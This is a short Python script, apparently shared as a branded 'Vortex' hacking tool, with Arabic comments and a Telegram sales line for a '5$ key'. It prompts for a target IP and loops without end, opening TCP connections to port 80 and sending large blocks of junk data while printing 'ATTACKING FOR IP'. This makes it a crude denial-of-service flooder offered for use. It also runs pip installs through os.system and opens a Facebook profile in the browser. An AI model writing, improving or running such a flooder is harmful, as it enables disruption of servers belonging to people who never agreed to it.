import os 

os.system('pip install socket')
os.system('pip install colorama')
os.system('pip install pystyle')
os.system('pip install time')
import webbrowser

# استبدل الرابط بعنوان حسابك الشخصي
url = "https://www.facebook.com/profile.php?id=100047274346924"

# فتح المتصفح بالعنوان المحدد
webbrowser.open(url)
os.system('clear')
import socket
from colorama import init
from colorama import Fore
init(autoreset= True)

from pystyle import *
from time import *
Ali = ''' ⠄⠄⠄⠄⠄⠄⣀⣀⣤⣤⣴⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣦⣤⣤⣄⣀⡀⠄⠄⠄⠄⠄
   ⠄⠄⠄⠄⣴⣿⣿⡿⣿⢿⣟⣿⣻⣟⡿⣟⣿⣟⡿⣟⣿⣻⣟⣿⣻⢿⣻⡿⣿⢿⣷⣆⠄⠄⠄
   ⠄⠄⠄⢘⣿⢯⣷⡿⡿⡿⢿⢿⣷⣯⡿⣽⣞⣷⣻⢯⣷⣻⣾⡿⡿⢿⢿⢿⢯⣟⣞⡮⡀⠄⠄
   ⠄⠄⠄⢸⢞⠟⠃⣉⢉⠉⠉⠓⠫⢿⣿⣷⢷⣻⣞⣿⣾⡟⠽⠚⠊⠉⠉⠉⠙⠻⣞⢵⠂⠄⠄
   ⠄⠄⠄⢜⢯⣺⢿⣻⣿⣿⣷⣔⡄⠄⠈⠛⣿⣿⡾⠋⠁⠄⠄⣄⣶⣾⣿⡿⣿⡳⡌⡗⡅⠄⠄
   ⠄⠄⠄⢽⢱⢳⢹⡪⡞⠮⠯⢯⡻⡬⡐⢨⢿⣿⣿⢀⠐⡥⣻⡻⠯⡳⢳⢹⢜⢜⢜⢎⠆⠄⠄
   ⠄⠄⠠⣻⢌⠘⠌⡂⠈⠁⠉⠁⠘⠑⢧⣕⣿⣿⣿⢤⡪⠚⠂⠈⠁⠁⠁⠂⡑⠡⡈⢮⠅⠄⠄
   ⠄⠄⠠⣳⣿⣿⣽⣭⣶⣶⣶⣶⣶⣺⣟⣾⣻⣿⣯⢯⢿⣳⣶⣶⣶⣖⣶⣮⣭⣷⣽⣗⠍⠄⠄
   ⠄⠄⢀⢻⡿⡿⣟⣿⣻⣽⣟⣿⢯⣟⣞⡷⣿⣿⣯⢿⢽⢯⣿⣻⣟⣿⣻⣟⣿⣻⢿⣿⢀⠄⠄
   ⠄⠄⠄⡑⡏⠯⡯⡳⡯⣗⢯⢟⡽⣗⣯⣟⣿⣿⣾⣫⢿⣽⠾⡽⣺⢳⡫⡞⡗⡝⢕⠕⠄⠄⠄
   ⠄⠄⠄⢂⡎⠅⡃⢇⠇⠇⣃⣧⡺⡻⡳⡫⣿⡿⣟⠞⠽⠯⢧⣅⣃⠣⠱⡑⡑⠨⢐⢌⠂⠄⠄
   ⠄⠄⠄⠐⠼⣦⢀⠄⣶⣿⢿⣿⣧⣄⡌⠂⠢⠩⠂⠑⣁⣅⣾⢿⣟⣷⠦⠄⠄⡤⡇⡪⠄⠄⠄
   ⠄⠄⠄⠄⠨⢻⣧⡅⡈⠛⠿⠿⠿⠛⠁⠄⢀⡀⠄⠄⠘⠻⠿⠿⠯⠓⠁⢠⣱⡿⢑⠄⠄⠄⠄
   ⠄⠄⠄⠄⠈⢌⢿⣷⡐⠤⣀⣀⣂⣀⢀⢀⡓⠝⡂⡀⢀⢀⢀⣀⣀⠤⢊⣼⡟⡡⡁⠄⠄⠄⠄
   ⠄⠄⠄⠄⠄⠈⢢⠚⣿⣄⠈⠉⠛⠛⠟⠿⠿⠟⠿⠻⠻⠛⠛⠉⠄⣠⠾⢑⠰⠈⠄⠄⠄⠄⠄
   ⠄⠄⠄⠄⠄⠄⠄⠑⢌⠿⣦⡡⣱⣸⣸⣆⠄⠄⠄⣰⣕⢔⢔⠡⣼⠞⡡⠁⠁⠄⠄⠄⠄⠄⠄
   ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠑⢝⢷⣕⡷⣿⡿⠄⠄⠠⣿⣯⣯⡳⡽⡋⠌⠄⠄⠄⠄⠄⠄⠄⠄⠄
   ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠙⢮⣿⣽⣯⠄⠄⢨⣿⣿⡷⡫⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
   ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠘⠙⠝⠂⠄⢘⠋⠃⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄                |©|˛ َِ𝗩َِ𝗼َِ𝗿َِ𝘁َِ𝗲َِ𝘅 .|©|

|̲̅̅‌●‌|‌=‌|‌●‌| ˛ َِ𝗩َِ𝗼َِ𝗿َِ𝘁َِ𝗲َِ𝘅 . |‌●‌|‌=‌|‌●‌|

|‌●‌|‌=‌|‌●‌|  ˛ َِ𝗩َِ𝗼َِ𝗿َِ𝘁َِ𝗲َِ𝘅 .  |‌●‌|‌=‌|‌●‌|

|‌●‌|‌=‌|‌●‌| ɴᴏᴛᴇ 5$ ғᴏʀ ᴋᴇʏ ᴛᴇʟᴇɢʀᴀᴍ @@Vortex757  |‌●‌|‌=‌|‌●‌|

|‌●‌|‌=‌|‌●‌| 웃 ˛ َِ𝗩َِ𝗼َِ𝗿َِ𝘁َِ𝗲َِ𝘅 . 웃  |‌●‌|‌=‌|‌●‌|      ╰╮✾╭╯✯ C5x✯╰╮✾╭╯
            
           ©˛ َِ𝗩َِ𝗼َِ𝗿َِ𝘁َِ𝗲َِ𝘅 .©
---------------------------------------------'''
Write.Print(Ali,Colors.red_to_green,interval=0.01)
print('')
ip =input(Fore.RED+'Enter your IP =>>')

while True:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)  # تعيين قيمة settimeout() على متغير sock
    conn = sock.connect((ip, 80))  # استدعاء connect() على sock
    data = "nshsvssjsbsvegejebdgejeeb" * 1000
    sock.send(data.encode())  # تحسين الكود بتشفير البيانات قبل الإرسال
    print(Fore.RED+'ATTACKING FOR IP',Fore.RED+ip,Fore.RED+ 'port 80')
